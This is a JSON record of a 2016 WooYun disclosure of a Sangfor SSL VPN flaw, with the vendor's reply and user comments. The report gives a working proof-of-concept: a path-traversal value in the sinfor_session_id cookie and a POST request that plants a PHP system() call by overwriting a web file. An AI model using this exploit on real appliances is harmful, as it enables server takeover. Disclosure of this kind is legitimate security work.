{"id": 88577, "wybug_id": "wooyun-2016-0195091", "wybug_title": "深信服SSL VPN getshell漏洞（有条件限制）                                      ", "wybug_corp": "深信服", "wybug_author": "路人甲", "wybug_date": "2016-04-11 18:42", "wybug_open_date": "2016-07-11 11:00", "wybug_type": "设计不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-15：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-06-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-11：\t细节向公众公开  简要描述： 来一发 详细说明：  这里为了保护厂商知识产权，隐去大部分代码漏洞利用前提：1、有登陆SSL VPN控制台的权限2、可以SSL VPN修改邮件服务器配置问题出在sysCfgController.class.php 147行（邮件服务器设置的发送测试邮件功能）\npublic function sendTestMail($SMTPServer, $SMTPPort, $DestAddr, $EmailTitle, $EnableCheckUsr=0, $EmailUser='', $EmailPassword='',$EmailFrom='',$LanguageType='zh_CN')\t\t{\t\t\t// 写入临时配置文件\t\t\t$conf_file = '/tmp/testmail_'.$_COOKIE['sinfor_session_id'];\t\t\t$contents  = \"[MAIL]\\n\";\t\t\t$contents .= \"EnableEmailNotice = \\\"1\\\"\\n\";\t\t\t$contents .= \"SMTPServer = \\\"$SMTPServer\\\"\\n\";\t\t\t$contents .= \"SMTPPort = \\\"$SMTPPort\\\"\\n\";\t\t\t$contents .= \"EnableCheckUsr = \\\"$EnableCheckUsr\\\"\\n\";\t\t\t$contents .= \"EmailUser = \\\"$EmailUser\\\"\\n\";\t\t\t$contents .= \"EmailPassword = \\\"$EmailPassword\\\"\\n\";\t\t\t$contents .= \"EmailFrom = \\\"$EmailFrom\\\"\\n\";\t\t\t$contents .= \"DestAddr = \\\"$DestAddr\\\"\\n\";\t\t\t$contents .= \"EmailTitle = \\\"$EmailTitle\\\"\\n\";\t\t\t$contents .= \"ContentsFile = \\\"/tmp/smtpsend_test.txt\\\"\\n\";\t\t\t@file_put_contents($conf_file, $contents);\t\t\tif (!file_exists($conf_file))\t\t\t\tthrow new FileException($conf_file);\nfile_put_contents在file_exists前执行，而$conf_file来源于cookie参数sinfor_session_id那么我们提交的时候修改cookie sinfor_session_id为：\nsinfor_session_id=W04EDB7D9DC3B2FAAD4A9DD6C23CE9B2/../../tmp/1.txt\n即可在/tmp/目录下创建一个1.txt文件如何getshell呢？向web根目录下写个php就行了呀但这里会碰到问题：新建的文件权限是-rw-------，也就是说web容器不能执行新建的文件为了突破这个问题，需要覆盖掉一个已存在的php文件，利用其x权限来达到getshell的目的就拿这个php开刀吧：/app/usr/sbin/webui/html/appSsoApi.php那么将cookie sinfor_session_id修改为：\nsinfor_session_id=W04EDB7D9DC3B2FAAD4A9DD6C23CE9B2/../../tmp/../../app/usr/sbin/webui/html/appSsoApi.php\n注意！此操作会覆盖上面的php文件最终POC：\nPOST /cgi-bin/php-cgi/html/delegatemodule/HttpHandler.php?controler=SysCfg&action=sendTestMail&token=72c791a93959bf388db3af864c09bbee82f2d1a8 HTTP/1.1Accept: */*Accept-Language: zh-CNReferer: https://***/html/tpl/mailMgt.htmlx-requested-with: XMLHttpRequestContent-Type: application/x-www-form-urlencoded; charset=UTF-8Accept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)Host: ***Content-Length: 122DNT: 1Connection: Keep-AliveCache-Control: no-cacheCookie: language=zh_CN; USER_CUSTOM_SETTING=1460011919; SESSID=C42EC5FBB05DCD23B13A3384C98E065DC8271CA9AC1B4F433557BC8C4FBC312; x-anti-csrf-gcs=72DFC30A00E3FB9E; sinfor_session_id=W04EDB7D9DC3B2FAAD4A9DD6C23CE9B2/../../tmp/../../app/usr/sbin/webui/html/appSsoApi.php; PHPSESSID=870a66816ba987171730e9b80753da82; x-act-flag-gcs=; usermrgstate=%7B%22params%22%3A%7B%22grpid%22%3A%2238%22%2C%22recflag%22%3A0%2C%22filter%22%3A0%7D%2C%22pageparams%22%3A%7B%22start%22%3A0%2C%22limit%22%3A25%7D%2C%22otherparams%22%3A%7B%22searchtype%22%3A0%2C%22recflag%22%3Afalse%7D%7D; hidecfg=%7B%22name%22%3Afalse%2C%22flag%22%3Afalse%2C%22note%22%3Afalse%2C%22expire%22%3Atrue%2C%22lastlogin_time%22%3Atrue%2C%22phone%22%3Atrue%2C%22allocateip%22%3Atrue%2C%22other%22%3Afalse%2C%22state%22%3Afalse%7DSMTPServer=<?php system(id);?>&SMTPPort=1&EmailUser=&EmailPassword=&EmailFrom=1&LanguageType=zh_CN&DestAddr=1&EmailTitle=1\n提交后访问https://***/cgi-bin/php-cgi/html/appSsoApi.php，可看到php代码执行：\n\n   漏洞证明：  \n\n   修复方案：  你懂的   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2016-04-12 10:50 厂商回复： 感谢白帽子提交的问题。经确认，该问题确实存在，但需要获取管理员权限后才能利用，影响较小。目前该问题已经解决，并将在下个版本进行更新。感谢白帽子为我们指出问题，请白帽子私信留下联系方式，我们将为您寄送礼物以示答谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-11 19:08 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:721 漏洞数:86        | sec.ly.com欢迎入驻)\t\t \n  m ark    \n     2016-04-11 20:48 |    \t\tExplo1t \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:9        | 流生若川，不要小看人生啊！)\t\t \n  mark    \n     2016-04-11 21:27 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1865 漏洞数:288        | 以大多数人的努力程度之低，根本轮不到去拼...)\t\t \n  这个6,我看到了希望。    \n     2016-04-11 22:02 |    \t\tAzui \t\t\t( 实习白帽子  |\t\t\t        Rank:61 漏洞数:15        | 人有两件宝，双手和大脑。)\t\t \n  mark    \n     2016-04-12 11:36 |    \t\tAirbasic \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:8        | 不要向我EMAIL发邮件，地址已失效！)\t\t \n  屌    \n     2016-04-15 16:42 |    \t\tsangfor.org \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:26        | 天下熙熙，皆为利来；天下攘攘，皆为利往...)\t\t \n  我司 感谢提交    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}